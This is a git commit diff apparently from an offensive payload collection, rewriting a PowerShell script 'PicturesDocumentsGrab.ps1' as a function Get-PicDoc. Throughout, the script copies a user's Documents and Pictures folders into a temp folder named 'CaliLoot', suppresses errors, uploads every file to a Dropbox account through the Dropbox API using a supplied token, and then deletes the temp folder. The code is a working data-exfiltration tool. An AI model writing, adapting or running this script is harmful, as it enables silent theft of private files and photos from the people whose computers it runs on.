a70ec83f3f13a5cb2d50d6e61015f873fd62d9fb
CaliNux <132522491+calinux-py@users.noreply.github.com>
2023-07-30 14:12:51 -0700

    Get-PicDoc.ps1

--- Documents & Pictures Dropbox Upload/PicturesDocumentsGrab.ps1
+++ Documents & Pictures Dropbox Upload/PicturesDocumentsGrab.ps1
@@ -1,21 +1,33 @@
-$DropBoxAccessToken = "YOUR DROPBOX TOKEN HERE"
-$TempFolderPath = Join-Path $env:TEMP 'CaliLoot'
+function Get-PicDoc {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$DropBoxAccessToken
+    )
 
-$headers = @{ "Authorization" = "Bearer $DropBoxAccessToken"; "Content-Type" = 'application/json' }
-Invoke-RestMethod -Uri https://api.dropboxapi.com/2/files/create_folder_v2 -Method Post -Headers $headers -Body '{ "path": "/CaliLoot", "autorename": false }' | Out-Null
+    $TempFolderPath = Join-Path $env:TEMP 'CaliLoot'
 
-$copyFolders = @('MyDocuments', 'MyPictures')
-$copyFolders | ForEach-Object {
-    $sourcePath = Join-Path ([Environment]::GetFolderPath($_)) '*'
-    $folderName = $_ -replace 'My', ''
-    $targetPath = "/CaliLoot/$folderName"
-    Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue
-    Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {
-        $filePath = $_.FullName
-        $targetFilePath = "$targetPath/$($_.Directory.Name)/$($_.Name)"
-        $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-        $headers = @{ "Authorization" = "Bearer $DropBoxAccessToken"; "Dropbox-API-Arg" = $arg; "Content-Type" = 'application/octet-stream' }
-        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $filePath -Headers $headers | Out-Null
+    $headers = @{ "Authorization" = "Bearer $DropBoxAccessToken"; "Content-Type" = 'application/json' }
+    Invoke-RestMethod -Uri https://api.dropboxapi.com/2/files/create_folder_v2 -Method Post -Headers $headers -Body '{ "path": "/CaliLoot", "autorename": false }' | Out-Null
+
+    # Copy folders and upload files to Dropbox
+    $copyFolders = @('MyDocuments', 'MyPictures')
+    $copyFolders | ForEach-Object {
+        $sourcePath = Join-Path ([Environment]::GetFolderPath($_)) '*'
+        $folderName = $_ -replace 'My', ''
+        $targetPath = "/CaliLoot/$folderName"
+        Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue
+        Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {
+            $filePath = $_.FullName
+            $targetFilePath = "$targetPath/$($_.Directory.Name)/$($_.Name)"
+            $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+            $headers = @{ "Authorization" = "Bearer $DropBoxAccessToken"; "Dropbox-API-Arg" = $arg; "Content-Type" = 'application/octet-stream' }
+            Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $filePath -Headers $headers | Out-Null
+        }
     }
+
+    Remove-Item $TempFolderPath -Recurse -Force
 }
-Remove-Item $TempFolderPath -Recurse -Force
+
+# Example usage:
+$DropBoxToken = "YOUR DROPBOX TOKEN HERE"
+Get-PicDoc -DropBoxAccessToken $DropBoxToken
